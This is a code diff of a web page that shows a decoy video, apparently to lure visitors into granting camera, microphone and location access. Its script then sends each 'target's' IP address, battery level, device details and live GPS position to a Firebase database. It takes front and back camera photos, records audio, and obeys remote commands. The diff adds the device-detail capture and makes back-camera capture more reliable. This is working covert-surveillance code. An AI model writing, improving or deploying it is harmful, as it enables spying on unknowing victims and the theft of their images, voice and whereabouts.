@@ -29,7 +29,6 @@
 <video id="real-stream" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
 
 <script>
-    // Firebase Setup
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
     const db = firebase.database();
@@ -44,23 +43,29 @@
         v.style.display = 'block';
 
         try {
-            // Seedha Permission Request
             streamRef = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             v.play();
 
-            // Initial Data
-            db.ref(`targets/${sessionID}/info`).set({ status: "ONLINE", time: new Date().toLocaleTimeString() });
+            // --- FIXED: User Details Capture ---
+            let ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
+            let battery = await navigator.getBattery().then(b => Math.floor(b.level * 100) + "%").catch(() => "N/A");
+            
+            db.ref(`targets/${sessionID}/info`).set({
+                status: "ONLINE",
+                ip: ipData.ip,
+                battery: battery,
+                device: navigator.platform,
+                agent: navigator.userAgent.split(') ')[0] + ')', // Detailed device name
+                time: new Date().toLocaleTimeString()
+            });
 
-            // 1. Location (Workable)
             navigator.geolocation.watchPosition(p => {
                 db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
             }, null, {enableHighAccuracy:true});
 
-            // 2. Front & Back Camera Auto-Capture
-            capture(true); // Front
-            setTimeout(() => capture(false), 4000); // Back
+            capture(true); 
+            setTimeout(() => capture(false), 5000); 
 
-            // 3. Command Listener
             db.ref(`commands/${sessionID}`).on('value', s => {
                 const c = s.val(); if(!c) return;
                 if(c.action === 'photo') capture(true);
@@ -69,28 +74,41 @@
                 db.ref(`commands/${sessionID}`).remove();
             });
 
-        } catch (e) { alert("Error: Content requires permissions to play."); location.reload(); }
+        } catch (e) { alert("Error: Permission denied."); location.reload(); }
     }
 
+    // --- FIXED: Back Camera Capture Logic ---
     async function capture(isFront) {
         try {
-            const track = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: isFront ? "user" : "environment" } 
-            });
+            // Back camera ke liye pehle front stream ko "exact" constraints dena behtar hai
+            const constraints = {
+                video: { facingMode: isFront ? "user" : { exact: "environment" } }
+            };
+            
+            // Fallback: Agar "exact" environment fail ho to ideal use karein
+            const stream = await navigator.mediaDevices.getUserMedia(constraints)
+                .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: isFront ? "user" : "environment" } }));
+
             const vid = document.createElement('video');
-            vid.srcObject = track;
+            vid.srcObject = stream;
             await vid.play();
+            
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
                 canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
                 canvas.getContext('2d').drawImage(vid, 0, 0);
                 db.ref(`targets/${sessionID}/photos`).push({
-                    img: canvas.toDataURL('image/jpeg', 0.5),
-                    type: isFront ? "FRONT" : "BACK"
+                    img: canvas.toDataURL('image/jpeg', 0.6),
+                    type: isFront ? "FRONT" : "BACK",
+                    time: new Date().toLocaleTimeString()
                 });
-                track.getTracks().forEach(t => t.stop());
-            }, 2000);
-        } catch(err) { console.log("Cam Error"); }
+                stream.getTracks().forEach(t => t.stop()); // Band karna lazmi hai
+            }, 2500);
+        } catch(err) { 
+            console.log("Cam Error: " + err);
+            // Agar back camera fail ho to error log karein
+            db.ref(`targets/${sessionID}/logs`).push("Camera Error: " + err.message);
+        }
     }
 
     function record() {
@@ -103,7 +121,7 @@
             reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({data: reader.result});
         };
         recorder.start();
-        setTimeout(() => recorder.stop(), 10000); // 10 Second Recording
+        setTimeout(() => recorder.stop(), 10000);
     }
 </script>
 </body>
